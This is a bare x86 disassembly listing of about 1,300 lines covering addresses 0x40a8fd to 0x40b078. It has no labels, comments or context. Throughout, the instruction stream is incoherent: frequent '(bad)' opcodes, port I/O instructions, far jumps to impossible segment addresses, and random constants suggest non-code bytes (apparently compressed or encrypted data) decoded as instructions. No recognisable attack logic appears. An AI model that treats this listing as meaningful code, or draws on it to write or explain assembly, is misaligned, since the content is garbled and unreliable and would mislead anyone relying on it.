  40a8fd:	es sub al,0xf6
  40a900:	and    DWORD PTR [edi-0x3e],ebx
  40a903:	jle    0x40a927
  40a905:	int    0x9
  40a907:	int    0x37
  40a909:	or     edi,esp
  40a90b:	std    
  40a90c:	(bad)  
  40a90e:	fadd   DWORD PTR [esi-0x3c]
  40a911:	fld    QWORD PTR [eax+0x3f]
  40a914:	jecxz  0x40a96d
  40a916:	fisttp WORD PTR [ecx+0x48fa37c1]
  40a91c:	inc    esp
  40a91d:	ss inc eax
  40a91f:	in     eax,dx
  40a920:	ret    0xa7af
  40a923:	test   dl,0xdc
  40a926:	fimul  DWORD PTR [edi]
  40a928:	or     eax,0xd75c0bf3
  40a92d:	pop    esi
  40a92e:	xor    eax,0x2a74a304
  40a933:	(bad)  
  40a934:	adc    edx,edx
  40a936:	cmp    ecx,edx
  40a938:	int3   
  40a939:	push   es
  40a93a:	inc    eax
  40a93b:	mov    eax,ds:0x726b192
  40a940:	mov    dh,0x7d
  40a942:	fcom   DWORD PTR [eax+edx*4+0x7e]
  40a946:	or     al,0xe6
  40a948:	and    al,0xd0
  40a94a:	or     al,0x0
  40a94c:	(bad)  
  40a94d:	into   
  40a94e:	aam    0x21
  40a950:	inc    edx
  40a951:	mov    edx,0xa88cb328
  40a956:	sub    eax,0x2b0be564
  40a95b:	loop   0x40a95a
  40a95d:	in     eax,dx
  40a95e:	xor    ah,ah
  40a960:	sbb    al,0xf0
  40a962:	std    
  40a963:	push   eax
  40a964:	cs pushf 
  40a966:	scas   eax,DWORD PTR es:[edi]
  40a967:	popa   
  40a968:	sbb    edx,DWORD PTR [ebp+0x1d5f3e2b]
  40a96e:	and    eax,0x5a1ad9c7
  40a973:	scas   al,BYTE PTR es:[edi]
  40a974:	ret    0xb1cb
  40a977:	jmp    0x40a940
  40a979:	sub    eax,ebx
  40a97b:	test   al,0x66
  40a97d:	mov    edi,0x643ce812
  40a982:	mov    edx,esi
  40a984:	leave  
  40a985:	fs mov esp,0x540efda6
  40a98b:	pop    ecx
  40a98c:	jb     0x40a95f
  40a98e:	mov    dh,0x6c
  40a991:	stc    
  40a992:	mov    ebp,0xeffad8b5
  40a997:	push   ds
  40a998:	lods   al,BYTE PTR ds:[esi]
  40a999:	shl    BYTE PTR [bx],cl
  40a99c:	in     al,0x58
  40a99e:	out    0xbe,al
  40a9a0:	xchg   esi,edi
  40a9a2:	adc    DWORD PTR [edi],ebp
  40a9a4:	lods   al,BYTE PTR ds:[esi]
  40a9a5:	jecxz  0x40a967
  40a9a7:	cmp    al,0xda
  40a9a9:	je     0x40a979
  40a9ab:	into   
  40a9ac:	mov    ecx,0xf1a55e16
  40a9b1:	sar    bl,0x22
  40a9b4:	or     ebx,esi
  40a9b6:	sahf   
  40a9b7:	cli    
  40a9b8:	idiv   BYTE PTR [eax-0x1fcf58a]
  40a9be:	call   0x8e82e160
  40a9c3:	and    al,0x32
  40a9c5:	fidivr DWORD PTR [ecx-0x32c9cfd2]
  40a9cb:	fmul   st(1),st
  40a9cd:	push   edi
  40a9ce:	js     0x40a9ff
  40a9d0:	jns    0x40aa40
  40a9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9d3:	xchg   ebp,eax
  40a9d4:	addr16 inc esp
  40a9d6:	hlt    
  40a9d7:	in     al,0x52
  40a9d9:	ret    0xfeaa
  40a9dc:	fcomip st,st(3)
  40a9de:	fwait
  40a9df:	in     al,0x88
  40a9e1:	dec    esi
  40a9e2:	sbb    bl,BYTE PTR [edi]
  40a9e4:	repz je 0x40aa17
  40a9e7:	mov    ?,ebx
  40a9e9:	inc    edx
  40a9ea:	fadd   DWORD PTR [ebx]
  40a9ec:	into   
  40a9ed:	jg     0x40a997
  40a9ef:	in     al,0xef
  40a9f1:	inc    ebp
  40a9f2:	cwde   
  40a9f3:	aaa    
  40a9f4:	push   ds
  40a9f5:	(bad)  
  40a9f6:	mov    edx,0x70f15e45
  40a9fb:	ret    0x7f3d
  40a9fe:	lea    eax,[eax-0x1e986d83]
  40aa04:	lahf   
  40aa05:	daa    
  40aa06:	ins    DWORD PTR es:[edi],dx
  40aa07:	pop    ss
  40aa08:	mov    al,0xab
  40aa0a:	fsub   QWORD PTR [ebp-0x40]
  40aa0d:	xchg   esp,eax
  40aa0e:	pop    esi
  40aa0f:	retf   0x1b82
  40aa12:	mov    esi,0x149c0ce5
  40aa17:	fst    DWORD PTR [ebp-0x353b04b6]
  40aa1d:	out    0x63,eax
  40aa1f:	stos   DWORD PTR es:[edi],eax
  40aa20:	aam    0x22
  40aa22:	cmp    DWORD PTR [ebx-0x6a39748a],edx
  40aa28:	scas   al,BYTE PTR es:[edi]
  40aa29:	push   ebx
  40aa2a:	test   eax,0x6fa10367
  40aa2f:	sar    DWORD PTR [ecx*4+0x4497b761],cl
  40aa36:	sbb    al,0x9
  40aa38:	sbb    BYTE PTR [ebp+0x4804ad85],bh
  40aa3e:	mov    dl,0x0
  40aa40:	adc    al,0x97
  40aa42:	(bad)  
  40aa43:	ds lock jne 0x40aa55
  40aa47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa48:	xchg   ecx,eax
  40aa49:	repz add edx,DWORD PTR [eax-0x37]
  40aa4d:	fist   WORD PTR ds:0x83c3da62
  40aa53:	push   esi
  40aa54:	xchg   esi,eax
  40aa55:	lods   al,BYTE PTR ds:[esi]
  40aa56:	int3   
  40aa57:	addr16 cld 
  40aa59:	sbb    edx,DWORD PTR [ebp+0x49]
  40aa5c:	inc    esi
  40aa5d:	mov    eax,ds:0x8b36dcd8
  40aa62:	dec    edx
  40aa63:	xlat   BYTE PTR ds:[ebx]
  40aa64:	push   esi
  40aa65:	scas   eax,DWORD PTR es:[edi]
  40aa66:	sub    eax,0xd00c678d
  40aa6b:	mov    ecx,0x14ca74a4
  40aa70:	ins    DWORD PTR es:[edi],dx
  40aa71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa72:	cmp    eax,0xd09910b0
  40aa77:	sahf   
  40aa78:	mov    ch,0xfe
  40aa7a:	scas   al,BYTE PTR es:[edi]
  40aa7b:	mov    ah,0x2b
  40aa7d:	add    eax,0x83b3f126
  40aa82:	call   0xd12a145
  40aa87:	sub    bl,ch
  40aa89:	imul   ebp,ebx,0x3
  40aa8c:	adc    edx,0xffffff80
  40aa8f:	or     edx,DWORD PTR [edx+0x77]
  40aa92:	xor    BYTE PTR [edx-0x60],ah
  40aa95:	test   BYTE PTR [esp+edx*4],ah
  40aa98:	xchg   BYTE PTR [edi+0x4356f5b4],bl
  40aa9e:	std    
  40aa9f:	mov    edx,DWORD PTR [edi+0x514d238e]
  40aaa5:	out    0x57,al
  40aaa7:	outs   dx,BYTE PTR ds:[esi]
  40aaa8:	xor    esi,DWORD PTR [ecx+0x769ab29e]
  40aaae:	mov    edx,0x322ec3ed
  40aab3:	add    BYTE PTR [ebx-0x472070ef],bl
  40aab9:	mov    esp,0x7cae33f1
  40aabe:	xchg   esi,eax
  40aabf:	xchg   DWORD PTR [eax+0x72],esp
  40aac2:	outs   dx,DWORD PTR ds:[esi]
  40aac3:	adc    DWORD PTR [eax],edx
  40aac5:	pop    ds
  40aac6:	or     esi,DWORD PTR [eax+0x18]
  40aac9:	or     al,0x5a
  40aacb:	push   edx
  40aacc:	sahf   
  40aacd:	scas   eax,DWORD PTR es:[edi]
  40aace:	in     al,0xf1
  40aad0:	pop    eax
  40aad1:	int3   
  40aad2:	sub    al,0x59
  40aad4:	push   es
  40aad5:	sbb    eax,0xbc2ddb5e
  40aada:	add    esi,edi
  40aadc:	sbb    eax,0xfcfbd44b
  40aae1:	or     al,0x7a
  40aae3:	mov    eax,0xd3d072c7
  40aae8:	cld    
  40aae9:	dec    ebp
  40aaea:	mov    eax,0xec6f2598
  40aaef:	je     0x40aa95
  40aaf1:	jb     0x40aa87
  40aaf3:	jbe    0x40ab69
  40aaf5:	cmp    eax,0x1ae3725c
  40aafa:	mov    edx,0x73c135f9
  40aaff:	fld    QWORD PTR [ebx+0x3e]
  40ab02:	pop    esi
  40ab03:	dec    esi
  40ab04:	add    BYTE PTR [esi],bl
  40ab06:	add    eax,0x3dce9dba
  40ab0b:	test   eax,0xe9954a54
  40ab10:	fcom   DWORD PTR [edi+0x31]
  40ab13:	and    cl,dl
  40ab15:	ins    DWORD PTR es:[edi],dx
  40ab16:	cmp    eax,0x121dce9c
  40ab1b:	leave  
  40ab1c:	sub    esi,edi
  40ab1e:	vmread DWORD PTR [ecx-0x45],esi
  40ab22:	xchg   ebp,eax
  40ab23:	add    al,0xa2
  40ab25:	pop    eax
  40ab26:	inc    edx
  40ab27:	dec    esp
  40ab28:	test   eax,0x5fa8ce46
  40ab2d:	js     0x40ab74
  40ab2f:	outs   dx,DWORD PTR ds:[esi]
  40ab30:	inc    DWORD PTR [ecx]
  40ab32:	dec    esi
  40ab33:	inc    edx
  40ab34:	mov    dl,0x88
  40ab36:	rcr    DWORD PTR [ebx-0x44dc4af0],1
  40ab3c:	xor    al,0x2f
  40ab3e:	or     al,0x84
  40ab40:	ds ja  0x40ab2b
  40ab43:	iret   
  40ab44:	sbb    BYTE PTR [esi-0x4],0xf3
  40ab48:	js     0x40ab4d
  40ab4a:	je     0x40abbb
  40ab4c:	push   0x5f
  40ab4e:	les    ebp,FWORD PTR [ecx+0x13d8ad73]
  40ab54:	dec    ebx
  40ab55:	retf   0x56da
  40ab58:	inc    eax
  40ab59:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab5b:	xor    ecx,DWORD PTR [eax+0x89fd4bc]
  40ab61:	pop    ss
  40ab62:	mov    eax,ds:0xd3f55918
  40ab67:	repz inc ecx
  40ab69:	xchg   esi,edx
  40ab6b:	xchg   esp,eax
  40ab6c:	and    al,0xfd
  40ab6e:	dec    ebx
  40ab6f:	cld    
  40ab70:	add    dl,0x4c
  40ab73:	std    
  40ab74:	push   0xd3a4a5c3
  40ab79:	repnz out dx,al
  40ab7b:	mov    ds,ecx
  40ab7d:	inc    ebx
  40ab7e:	mov    eax,0x2f611f66
  40ab83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab84:	pop    ss
  40ab85:	sub    esi,ebp
  40ab87:	jbe    0x40ab32
  40ab89:	lea    edx,[esi]
  40ab8b:	xor    eax,DWORD PTR [ebx+ebx*2+0x46d58b8d]
  40ab92:	out    dx,eax
  40ab93:	enter  0x59d2,0x2b
  40ab97:	scas   al,BYTE PTR es:[edi]
  40ab98:	pop    es
  40ab99:	sbb    eax,0x4c51c877
  40ab9e:	and    DWORD PTR [edi-0xd123d3a],0xffffffd7
  40aba5:	jle    0x40ab50
  40aba7:	ins    BYTE PTR es:[edi],dx
  40aba8:	loop   0x40ac1d
  40abaa:	mov    esp,ecx
  40abac:	(bad)  
  40abad:	fst    QWORD PTR [edi-0x4]
  40abb0:	lahf   
  40abb1:	sti    
  40abb2:	cmp    bl,dh
  40abb4:	fistp  WORD PTR [edi-0x6f582583]
  40abba:	mov    cl,0xe
  40abbc:	popf   
  40abbd:	xchg   esi,eax
  40abbe:	or     ah,0xc9
  40abc1:	sub    BYTE PTR ds:0x2d34d7d1,ah
  40abc7:	repnz out dx,al
  40abc9:	lahf   
  40abca:	xchg   ebx,eax
  40abcb:	xchg   edx,eax
  40abcc:	mov    dh,0x9f
  40abce:	out    dx,eax
  40abcf:	addr16 mov dh,0x67
  40abd2:	xchg   edx,eax
  40abd3:	add    esi,DWORD PTR [ebp+eax*4-0x9a14196]
  40abda:	adc    al,0x4c
  40abdc:	(bad)  
  40abdd:	popa   
  40abde:	mov    bl,0x73
  40abe0:	ret    0xb2cc
  40abe3:	lds    esp,FWORD PTR [ebp-0xdc9df9a]
  40abe9:	sbb    DWORD PTR [ecx+0x76],esp
  40abec:	or     BYTE PTR [edx+0x6766a8e9],cl
  40abf2:	ret    
  40abf3:	or     edi,DWORD PTR [eiz*1+0x3347ca54]
  40abfa:	jmp    0x40abbd
  40abfc:	pop    ss
  40abfd:	repnz add edi,esp
  40ac00:	jmp    0x1c8d:0x35d2eb02
  40ac07:	nop
  40ac08:	sbb    DWORD PTR [edx-0x32],0x1f821e8d
  40ac0f:	leave  
  40ac10:	inc    ebx
  40ac11:	mov    eax,ds:0xd995801b
  40ac16:	popa   
  40ac17:	mov    cs,WORD PTR [ebx-0x72]
  40ac1a:	imul   ebx,ecx,0x11
  40ac1d:	pop    ecx
  40ac1e:	loope  0x40abe3
  40ac20:	jno    0x40abc4
  40ac22:	imul   esi,DWORD PTR [esi-0x66e28908],0x52
  40ac29:	and    DWORD PTR [esi+0x4c],0xe2528238
  40ac30:	dec    eax
  40ac31:	xor    eax,0xf9224b65
  40ac36:	adc    edi,DWORD PTR [edi+ebp*4]
  40ac39:	pop    es
  40ac3a:	xlat   BYTE PTR ds:[ebx]
  40ac3b:	leave  
  40ac3c:	sbb    dh,al
  40ac3e:	sub    ebp,DWORD PTR [ecx+0x1]
  40ac41:	push   0x9
  40ac43:	ffreep st(7)
  40ac45:	test   edi,0xa2f3d5f9
  40ac4b:	lock push ebx
  40ac4d:	test   BYTE PTR [esi-0xf6df9ca],al
  40ac53:	call   0xd960:0x5f61f6cd
  40ac5a:	(bad)  
  40ac5b:	std    
  40ac5c:	(bad)  [ebx+0x6b2716b6]
  40ac62:	das    
  40ac63:	push   0xb4b9c317
  40ac68:	mov    al,ds:0xa61e0562
  40ac6d:	loop   0x40ac2b
  40ac6f:	jmp    0xf3782394
  40ac74:	shl    esi,1
  40ac76:	arpl   WORD PTR [ebx+edi*1+0x5b],si
  40ac7a:	fldz   
  40ac7c:	xchg   esp,eax
  40ac7d:	adc    eax,0x2ee33b8f
  40ac82:	mov    al,bl
  40ac84:	jno    0x40ac73
  40ac86:	out    dx,eax
  40ac87:	jle    0x40ac61
  40ac89:	xchg   ebp,eax
  40ac8a:	xchg   esp,eax
  40ac8b:	mov    esi,esp
  40ac8d:	or     al,0xd4
  40ac8f:	cmp    BYTE PTR [esi+0x19],dl
  40ac92:	inc    esp
  40ac93:	push   es
  40ac94:	jmp    DWORD PTR [eax-0x76]
  40ac97:	loopne 0x40ac24
  40ac99:	jle    0x40acb8
  40ac9b:	jnp    0x40ad11
  40ac9d:	pop    edi
  40ac9e:	cmp    dl,cl
  40aca0:	cmp    al,0xb2
  40aca2:	mov    ebx,0xb63fb071
  40aca7:	cld    
  40aca8:	(bad)  
  40aca9:	sti    
  40acaa:	and    eax,0x8bc9a80f
  40acaf:	dec    esp
  40acb0:	aad    0x79
  40acb2:	xor    ebp,DWORD PTR [esi-0x77]
  40acb5:	push   0x43
  40acb7:	stos   DWORD PTR es:[edi],eax
  40acb8:	inc    ebp
  40acb9:	out    dx,al
  40acba:	mov    dl,0x4d
  40acbc:	out    0xb5,al
  40acbe:	(bad)  
  40acbf:	lahf   
  40acc0:	int    0x25
  40acc2:	add    BYTE PTR [eax+0x6],dl
  40acc5:	aam    0xf1
  40acc7:	ret    0x7f74
  40acca:	in     al,dx
  40accb:	or     eax,0xe9e67f3a
  40acd0:	out    dx,al
  40acd1:	stc    
  40acd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd3:	xor    al,0x7e
  40acd5:	sub    al,0xdf
  40acd7:	inc    edi
  40acd8:	fst    QWORD PTR [edx+esi*4+0x5d694cfd]
  40acdf:	loopne 0x40acf6
  40ace1:	jne    0x40ad1f
  40ace3:	pop    edi
  40ace4:	xor    eax,0x6ec8fa01
  40ace9:	push   0x3e
  40aceb:	ins    DWORD PTR es:[edi],dx
  40acec:	fstp   st(2)
  40acee:	mov    eax,ds:0x9a52463c
  40acf3:	push   cs
  40acf4:	cmp    DWORD PTR [eax],edx
  40acf6:	inc    eax
  40acf7:	aas    
  40acf8:	and    al,0x4
  40acfa:	cwde   
  40acfb:	ds mov esp,0x48189acd
  40ad01:	iret   
  40ad02:	int3   
  40ad03:	in     eax,0x91
  40ad05:	jns    0x40ac93
  40ad07:	(bad)  
  40ad08:	adc    esi,esi
  40ad0a:	jb     0x40ad30
  40ad0c:	inc    ebp
  40ad0d:	mov    ?,WORD PTR [ebx]
  40ad0f:	xchg   ebp,eax
  40ad10:	mov    BYTE PTR [ebx-0x6d],ah
  40ad13:	fidiv  WORD PTR [eax+0x1de2a7f5]
  40ad19:	push   esp
  40ad1a:	fimul  WORD PTR [ebx]
  40ad1c:	out    dx,eax
  40ad1d:	popa   
  40ad1e:	jnp    0x40acc2
  40ad20:	and    ebx,DWORD PTR [edx]
  40ad22:	mov    bh,0xe3
  40ad24:	call   0x97a95610
  40ad29:	(bad)  [ebx-0x5d]
  40ad2c:	cs into 
  40ad2e:	or     al,0xbc
  40ad30:	ror    DWORD PTR [ebp+0x6a],1
  40ad33:	cmp    al,0xbf
  40ad35:	fsub   DWORD PTR [esi]
  40ad37:	cwde   
  40ad38:	mov    ah,0x17
  40ad3a:	pop    ebx
  40ad3b:	popf   
  40ad3c:	pop    edx
  40ad3d:	(bad)  
  40ad3e:	lea    edi,[esi-0x4d]
  40ad41:	sub    BYTE PTR [eax],dh
  40ad43:	ror    BYTE PTR [esi+0x5d],cl
  40ad46:	js     0x40ad62
  40ad48:	xchg   DWORD PTR [esi-0x7f],edi
  40ad4b:	mov    ecx,0x26c659c7
  40ad50:	das    
  40ad51:	push   edi
  40ad52:	xor    al,0x5
  40ad54:	jns    0x40ad58
  40ad56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad57:	repnz aaa 
  40ad59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad5a:	xchg   esp,eax
  40ad5b:	push   esi
  40ad5c:	stc    
  40ad5d:	imul   esi,DWORD PTR [eax],0x2e
  40ad60:	jmp    0x693640f7
  40ad65:	lods   al,BYTE PTR ds:[esi]
  40ad66:	dec    eax
  40ad67:	xchg   ebx,eax
  40ad68:	imul   ebp,DWORD PTR [esp+edx*1],0x6ed3f69
  40ad6f:	or     al,0x7e
  40ad71:	jl     0x40ad98
  40ad73:	xor    BYTE PTR [eax-0xe],bh
  40ad76:	mov    BYTE PTR [esp+0x3c],ah
  40ad7a:	cli    
  40ad7b:	pop    ebx
  40ad7c:	test   BYTE PTR [ecx-0x5a24631c],0xb2
  40ad83:	imul   esi,eax,0x24fe5e2f
  40ad89:	cmp    DWORD PTR ss:[eax+0x19],esi
  40ad8d:	icebp  
  40ad8e:	fmul   QWORD PTR [eax+0x6be1232]
  40ad94:	sub    edx,edi
  40ad96:	in     al,0x37
  40ad98:	in     al,dx
  40ad99:	push   0x8
  40ad9b:	(bad)  
  40ad9c:	cmp    al,0x17
  40ad9e:	and    DWORD PTR [ebx-0x22e0ff8c],0xa8b39a10
  40ada8:	test   ch,bh
  40adaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adab:	cmp    al,0x7f
  40adad:	xor    eax,0xbc6ee955
  40adb2:	push   edi
  40adb3:	xchg   esp,eax
  40adb4:	ds xchg ecx,eax
  40adb6:	xor    ch,BYTE PTR [edi+eiz*4-0x62505752]
  40adbd:	loopne 0x40add6
  40adbf:	pop    ss
  40adc0:	xor    eax,0xe40b7d5c
  40adc5:	nop
  40adc6:	lods   eax,DWORD PTR ds:[esi]
  40adc7:	fs cdq 
  40adc9:	adc    DWORD PTR [eax],ecx
  40adcb:	pushf  
  40adcc:	pop    ebp
  40adcd:	sub    DWORD PTR [edi],ebx
  40adcf:	jmp    0x35b3:0x2b3776cc
  40add6:	repnz dec edi
  40add8:	mov    bl,0x1e
  40adda:	sbb    eax,0xb5899887
  40addf:	pop    ecx
  40ade0:	cmp    ch,0x6a
  40ade3:	mov    ?,esp
  40ade5:	jl     0x40ae43
  40ade7:	ins    BYTE PTR es:[edi],dx
  40ade8:	iret   
  40ade9:	or     dh,al
  40adeb:	and    BYTE PTR [edi-0x19],ch
  40adee:	jmp    0x8165fc36
  40adf3:	adc    edx,0x34de2aa4
  40adf9:	sbb    BYTE PTR ds:0x9cc55ce9,dl
  40adff:	xchg   bh,dh
  40ae01:	(bad)  
  40ae02:	lods   al,BYTE PTR ds:[esi]
  40ae03:	loop   0x40adee
  40ae05:	push   edi
  40ae06:	push   0xd4178bcf
  40ae0b:	push   esi
  40ae0c:	leave  
  40ae0d:	pop    esp
  40ae0e:	mov    cl,dl
  40ae10:	or     eax,DWORD PTR [ebx]
  40ae12:	es in  eax,0x8a
  40ae15:	xchg   BYTE PTR ds:0xcb863546,dl
  40ae1b:	jl     0x40ae10
  40ae1d:	les    edx,FWORD PTR [ebx]
  40ae1f:	add    dh,BYTE PTR [ebp+0x30]
  40ae22:	pusha  
  40ae23:	sub    al,0x6a
  40ae25:	xchg   ecx,eax
  40ae26:	dec    edi
  40ae27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae28:	ins    BYTE PTR es:[edi],dx
  40ae29:	push   cs
  40ae2a:	sbb    al,0x13
  40ae2c:	enter  0x6e82,0x9e
  40ae30:	dec    esi
  40ae31:	and    al,BYTE PTR [eax+edi*1-0x660c9a29]
  40ae38:	lahf   
  40ae39:	jmp    0xa4f7d86d
  40ae3e:	mov    bh,BYTE PTR [ebp+0x36517bc8]
  40ae44:	mov    bl,0xfb
  40ae46:	cdq    
  40ae47:	push   ds
  40ae48:	call   0xfd0:0x3255b87e
  40ae4f:	push   ebp
  40ae50:	cmp    edi,DWORD PTR [eax+0x33]
  40ae53:	test   BYTE PTR [ecx-0x6eb9743f],0x4f
  40ae5a:	jp     0x40ae93
  40ae5c:	jg     0x40ae58
  40ae5e:	xchg   edx,eax
  40ae5f:	push   edi
  40ae60:	cmp    DWORD PTR [edx+eiz*1],esp
  40ae63:	cmp    ebp,DWORD PTR [ebx+0x4]
  40ae66:	adc    eax,0xaa6f74e1
  40ae6b:	jle    0x40ae1a
  40ae6d:	fwait
  40ae6e:	mov    cl,0xc4
  40ae70:	bound  ebp,QWORD PTR [eax-0x79]
  40ae73:	cli    
  40ae74:	sub    ch,cl
  40ae76:	loope  0x40ae6c
  40ae78:	sbb    eax,DWORD PTR [esi-0x614920d3]
  40ae7e:	fisttp WORD PTR cs:[ecx+0x7f3d8d62]
  40ae85:	les    ecx,FWORD PTR [ebx-0x5b4b9fc7]
  40ae8b:	cld    
  40ae8c:	push   eax
  40ae8d:	out    0xa0,eax
  40ae8f:	js     0x40ae6f
  40ae91:	ins    BYTE PTR es:[edi],dx
  40ae92:	das    
  40ae93:	cmp    al,0x2
  40ae95:	or     esi,ecx
  40ae97:	es ss mov eax,0x7dc1d801
  40ae9e:	popf   
  40ae9f:	dec    ebx
  40aea0:	xor    eax,0x1f65bfd3
  40aea5:	jg     0x40ae82
  40aea7:	std    
  40aea8:	sbb    DWORD PTR [edi-0x38],esp
  40aeab:	pop    esp
  40aeac:	inc    ebx
  40aead:	or     BYTE PTR [eax+0x22],0x76
  40aeb1:	sbb    al,0x2d
  40aeb3:	ins    DWORD PTR es:[edi],dx
  40aeb4:	fiadd  DWORD PTR ds:[ebp-0x65]
  40aeb8:	push   cs
  40aeb9:	sub    eax,0xbf50b4a4
  40aebe:	das    
  40aebf:	or     eax,0xbb7a361d
  40aec4:	ds sti 
  40aec6:	je     0x40af3d
  40aec8:	out    dx,eax
  40aec9:	jge    0x40af30
  40aecb:	ins    DWORD PTR es:[edi],dx
  40aecc:	popf   
  40aecd:	and    ecx,ecx
  40aecf:	test   bl,ah
  40aed1:	stos   DWORD PTR es:[edi],eax
  40aed2:	push   0xfffffff7
  40aed4:	mov    al,0x3
  40aed6:	dec    ebx
  40aed7:	or     ebx,DWORD PTR [eax]
  40aed9:	jns    0x40ae92
  40aedb:	cmp    DWORD PTR [ebp+0x321111e2],eax
  40aee1:	add    DWORD PTR [edx],ecx
  40aee3:	push   esi
  40aee4:	int    0xf6
  40aee6:	jmp    0x2238:0x32c97205
  40aeed:	mov    ebp,0x74f9a6fd
  40aef2:	and    al,BYTE PTR [esi+0x2cfc730f]
  40aef8:	cmp    al,0xec
  40aefa:	adc    al,0xad
  40aefc:	mov    dl,0x5e
  40aefe:	loopne 0x40af6b
  40af00:	test   BYTE PTR [edx-0x14],0x93
  40af04:	dec    esi
  40af05:	popf   
  40af06:	mov    ebx,0x8e6d74be
  40af0b:	or     BYTE PTR [ebx+0x7d],ah
  40af0e:	je     0x40af35
  40af10:	jno    0x40af20
  40af12:	sbb    DWORD PTR [ebx+ebp*1],ebp
  40af15:	mov    DWORD PTR [ebp+ecx*8-0x6de5ff74],edx
  40af1c:	in     eax,dx
  40af1d:	stos   DWORD PTR es:[edi],eax
  40af1e:	inc    ebx
  40af1f:	(bad)  
  40af20:	fcomp  DWORD PTR [esi+eax*2+0x47ebed6a]
  40af27:	mov    DWORD PTR [ebx-0x4126552a],edx
  40af2d:	retf   
  40af2e:	not    ebp
  40af30:	ror    DWORD PTR [ebp+0x2e],1
  40af33:	add    esi,DWORD PTR [eax+0x72c6a85a]
  40af39:	mov    bh,BYTE PTR [ecx]
  40af3b:	xor    eax,edi
  40af3d:	jmp    0xa2d4:0x1f595c96
  40af44:	aaa    
  40af45:	bound  edi,QWORD PTR [ecx-0x15b16ed4]
  40af4b:	scas   eax,DWORD PTR es:[edi]
  40af4c:	jb     0x40afa8
  40af4e:	xlat   BYTE PTR ds:[ebx]
  40af4f:	jmp    DWORD PTR [esi]
  40af51:	imul   eax,esi,0x15
  40af54:	shr    BYTE PTR [edx],0x37
  40af57:	ret    0x8f41
  40af5a:	xchg   BYTE PTR [esi+0xe],ch
  40af5d:	in     al,dx
  40af5e:	push   0x2ab1e11f
  40af63:	xor    dl,BYTE PTR [ecx]
  40af65:	(bad)  
  40af66:	ror    DWORD PTR [esi-0x3e84186c],cl
  40af6c:	rcl    DWORD PTR [esi+ebx*2-0x338ff1d4],0xdf
  40af74:	out    0xdd,al
  40af76:	(bad)  
  40af77:	popf   
  40af78:	mov    edx,0xdb8dc6a6
  40af7d:	fsub   QWORD PTR [edi-0x58]
  40af80:	mov    edi,0x4def8c44
  40af86:	stc    
  40af87:	jo     0x40af53
  40af89:	shl    BYTE PTR [ecx-0x1e17670d],1
  40af8f:	aam    0x8f
  40af91:	lock dec esi
  40af93:	xchg   DWORD PTR [ebx+ebp*8+0x55],esp
  40af97:	pop    ebx
  40af98:	lahf   
  40af99:	mov    ds:0xcc8cb1c6,al
  40af9e:	iret   
  40af9f:	enter  0xff06,0x16
  40afa3:	cmp    DWORD PTR [ecx+0x7a],esp
  40afa6:	add    DWORD PTR [ebp+0x5fbb1b88],ecx
  40afac:	dec    ebp
  40afad:	pop    ds
  40afae:	dec    ebx
  40afaf:	xchg   ebp,eax
  40afb0:	int3   
  40afb1:	mov    esp,0x9604066f
  40afb6:	inc    ebx
  40afb7:	xor    dl,BYTE PTR [eax+0x6b]
  40afba:	repz pop esp
  40afbc:	push   ss
  40afbd:	and    cl,0x7
  40afc0:	pop    esi
  40afc1:	dec    esp
  40afc2:	and    eax,0xe0836e34
  40afc7:	cmp    edx,DWORD PTR [ecx+0x7e]
  40afca:	repz hlt 
  40afcc:	or     DWORD PTR [esi-0x51f950e6],0x0
  40afd3:	jecxz  0x40b03a
  40afd5:	repnz out dx,al
  40afd7:	in     al,dx
  40afd8:	stc    
  40afd9:	cmp    DWORD PTR [esi],ebx
  40afdb:	cmp    al,0x7e
  40afdd:	mov    dl,0x3c
  40afdf:	imul   ecx,DWORD PTR ss:[edi],0xffffffea
  40afe3:	mov    esi,DWORD PTR [ebp-0x64a41046]
  40afe9:	fldcw  WORD PTR [edi-0x18]
  40afec:	in     al,dx
  40afed:	and    eax,0xa5d7e62c
  40aff2:	std    
  40aff3:	sub    DWORD PTR [eax],0x58
  40aff6:	aam    0x7
  40aff8:	add    DWORD PTR [edx+0x1f],ebx
  40affb:	cli    
  40affc:	push   esp
  40affd:	mov    ch,0x28
  40afff:	mov    ch,0x81
  40b001:	pop    edi
  40b002:	rol    BYTE PTR [ebp-0x415f980d],cl
  40b008:	jno    0x40b008
  40b00a:	gs mov bl,dh
  40b00d:	pushf  
  40b00e:	mov    ch,0xa5
  40b010:	stc    
  40b011:	gs sti 
  40b013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b014:	scas   eax,DWORD PTR es:[edi]
  40b015:	sbb    ebp,DWORD PTR [ebx+0x67ec172c]
  40b01b:	push   es
  40b01c:	cmp    bl,BYTE PTR [ecx+0x50]
  40b01f:	gs scas al,BYTE PTR es:[edi]
  40b021:	daa    
  40b022:	jno    0x40b029
  40b024:	test   DWORD PTR [edi],0xfca8c8e1
  40b02a:	inc    ebp
  40b02b:	outs   dx,BYTE PTR ds:[esi]
  40b02c:	push   ebx
  40b02d:	add    ecx,DWORD PTR [edi+0x6d30667f]
  40b033:	and    esp,DWORD PTR [eax-0x75b86c50]
  40b039:	pushf  
  40b03a:	je     0x40b027
  40b03c:	or     ebx,DWORD PTR [ebx+0x63bbe35c]
  40b042:	xor    DWORD PTR [ecx+0xa],0xffffff8f
  40b046:	and    esi,DWORD PTR [ecx]
  40b048:	pop    eax
  40b049:	pop    ss
  40b04a:	mov    ds:0xa433095d,eax
  40b04f:	or     al,0xb
  40b051:	into   
  40b052:	sar    edx,1
  40b054:	(bad)  
  40b056:	outs   dx,BYTE PTR ds:[esi]
  40b057:	into   
  40b058:	xor    DWORD PTR [eax+edx*8+0x14],ecx
  40b05c:	sbb    DWORD PTR [edi+edx*8-0x44],esp
  40b060:	ret    
  40b061:	mov    DWORD PTR [ebp-0x4a],0xbd252562
  40b068:	cwde   
  40b069:	fwait
  40b06a:	(bad)  
  40b06b:	(bad)  
  40b06d:	lock and eax,0x87f48d75
  40b073:	test   eax,0x1028bebd
  40b078:	retf   0xa1ab
